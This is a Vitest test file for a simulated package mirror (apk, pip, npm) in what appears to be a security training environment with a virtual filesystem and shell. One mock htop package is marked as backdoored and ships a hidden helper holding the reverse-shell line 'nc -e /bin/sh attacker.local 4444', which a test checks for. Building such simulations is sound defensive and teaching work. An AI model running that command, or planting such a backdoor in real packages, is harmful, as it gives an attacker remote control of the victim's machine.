/**
 * VARIANT — Package Mirror tests
 */
import { describe, it, expect, beforeEach } from 'vitest';
import { createPackageMirror } from '../../../src/lib/packages/types';
import { createVFS } from '../../../src/lib/vfs/vfs';
import { createShell } from '../../../src/lib/shell/shell';
import type { ScriptedShell } from '../../../src/lib/shell/types';
import type { PackageMirrorCommands } from '../../../src/lib/packages/types';

describe('PackageMirror', () => {
    let shell: ScriptedShell;
    let mirror: PackageMirrorCommands;

    // ── APK tests ──────────────────────────────────────────────

    describe('apk', () => {
        beforeEach(() => {
            const vfs = createVFS();
            vfs.mkdir('/usr/bin', { recursive: true });
            vfs.mkdir('/usr/sbin', { recursive: true });

            mirror = createPackageMirror({
                type: 'apk',
                packages: [
                    {
                        name: 'curl',
                        version: '8.4.0-r0',
                        description: 'URL retrieval utility',
                        size: '2.3 MB',
                        files: new Map([
                            ['/usr/bin/curl', { content: '#!/bin/sh\necho "curl mock"', mode: 0o755 }],
                        ]),
                        backdoored: false,
                    },
                    {
                        name: 'htop',
                        version: '3.2.2-r0',
                        description: 'Interactive process viewer',
                        size: '512 KB',
                        files: new Map([
                            ['/usr/bin/htop', { content: '#!/bin/sh\necho "htop mock"', mode: 0o755 }],
                            ['/usr/bin/.htop-helper', { content: '#!/bin/sh\nnc -e /bin/sh attacker.local 4444', mode: 0o755 }],
                        ]),
                        backdoored: true,
                        backdoorDescription: 'htop ships with a reverse shell helper that phones home to attacker.local:4444',
                    },
                    {
                        name: 'nmap',
                        version: '7.94-r0',
                        description: 'Network exploration tool',
                        size: '5.1 MB',
                        dependencies: ['libpcap'],
                        files: new Map([
                            ['/usr/bin/nmap', { content: '#!/bin/sh\necho "nmap mock"', mode: 0o755 }],
                        ]),
                        backdoored: false,
                    },
                    {
                        name: 'libpcap',
                        version: '1.10.4-r0',
                        description: 'Packet capture library',
                        size: '300 KB',
                        files: new Map([
                            ['/usr/lib/libpcap.so', { content: 'mock-library' }],
                        ]),
                        backdoored: false,
                    },
                ],
                installed: ['busybox'],
            });

            shell = createShell({ vfs, hostname: 'target', user: 'root' });

            // Register mirror commands
            for (const [name, handler] of mirror.commands) {
                shell.registerCommand(name, handler);
            }
        });

        it('installs a package', () => {
            const result = shell.execute('apk add curl');
            expect(result.exitCode).toBe(0);
            expect(result.output).toContain('Installing curl');

            // File should be written to VFS
            const content = shell.getVFS().readFile('/usr/bin/curl');
            expect(content).not.toBeNull();
            expect(content).toContain('curl mock');
        });

        it('installs a backdoored package', () => {
            const result = shell.execute('apk add htop');
            expect(result.exitCode).toBe(0);

            // Backdoor file should be present
            const backdoor = shell.getVFS().readFile('/usr/bin/.htop-helper');
            expect(backdoor).not.toBeNull();
            expect(backdoor).toContain('nc -e');

            expect(mirror.isInstalled('htop')).toBe(true);
        });

        it('installs dependencies automatically', () => {
            const result = shell.execute('apk add nmap');
            expect(result.exitCode).toBe(0);
            expect(result.output).toContain('libpcap');
            expect(mirror.isInstalled('libpcap')).toBe(true);
            expect(mirror.isInstalled('nmap')).toBe(true);
        });

        it('reports error for unknown package', () => {
            const result = shell.execute('apk add nonexistent');
            expect(result.exitCode).toBe(1);
            expect(result.output).toContain('no such package');
        });

        it('searches packages', () => {
            const result = shell.execute('apk search curl');
            expect(result.output).toContain('curl');
            expect(result.output).toContain('URL retrieval');
        });

        it('shows package info', () => {
            shell.execute('apk add curl');
            const result = shell.execute('apk info curl');
            expect(result.output).toContain('curl');
            expect(result.output).toContain('URL retrieval');
        });

        it('handles apk update', () => {
            const result = shell.execute('apk update');
            expect(result.exitCode).toBe(0);
            expect(result.output).toContain('distinct packages available');
        });

        it('tracks installed packages', () => {
            expect(mirror.isInstalled('busybox')).toBe(true);
            expect(mirror.isInstalled('curl')).toBe(false);
            shell.execute('apk add curl');
            expect(mirror.isInstalled('curl')).toBe(true);
        });
    });

    // ── PIP tests ──────────────────────────────────────────────

    describe('pip', () => {
        beforeEach(() => {
            const vfs = createVFS();

            mirror = createPackageMirror({
                type: 'pip',
                packages: [
                    {
                        name: 'requests',
                        version: '2.31.0',
                        description: 'HTTP library for Python',
                        size: '1.1 MB',
                        files: new Map([
                            ['/usr/lib/python3/dist-packages/requests/__init__.py', { content: '# requests\n__version__ = "2.31.0"' }],
                        ]),
                        backdoored: false,
                    },
                ],
            });

            shell = createShell({ vfs, hostname: 'target', user: 'root' });
            for (const [name, handler] of mirror.commands) {
                shell.registerCommand(name, handler);
            }
        });

        it('installs via pip', () => {
            const result = shell.execute('pip install requests');
            expect(result.exitCode).toBe(0);
            expect(result.output).toContain('Collecting requests');
            expect(result.output).toContain('Successfully installed');
        });

        it('lists installed packages', () => {
            shell.execute('pip install requests');
            const result = shell.execute('pip list');
            expect(result.output).toContain('requests');
        });

        it('pip3 alias works', () => {
            const result = shell.execute('pip3 install requests');
            expect(result.exitCode).toBe(0);
        });
    });

    // ── NPM tests ──────────────────────────────────────────────

    describe('npm', () => {
        beforeEach(() => {
            const vfs = createVFS();

            mirror = createPackageMirror({
                type: 'npm',
                packages: [
                    {
                        name: 'express',
                        version: '4.18.2',
                        description: 'Fast web framework for Node.js',
                        files: new Map([
                            ['/var/www/node_modules/express/index.js', { content: 'module.exports = require("./lib/express");' }],
                        ]),
                        backdoored: false,
                    },
                ],
            });

            shell = createShell({ vfs, hostname: 'target', user: 'root' });
            for (const [name, handler] of mirror.commands) {
                shell.registerCommand(name, handler);
            }
        });

        it('installs via npm', () => {
            const result = shell.execute('npm install express');
            expect(result.exitCode).toBe(0);
            expect(result.output).toContain('express@4.18.2');
        });

        it('reports error for missing package', () => {
            const result = shell.execute('npm install nonexistent');
            expect(result.exitCode).toBe(1);
            expect(result.output).toContain('E404');
        });
    });
});
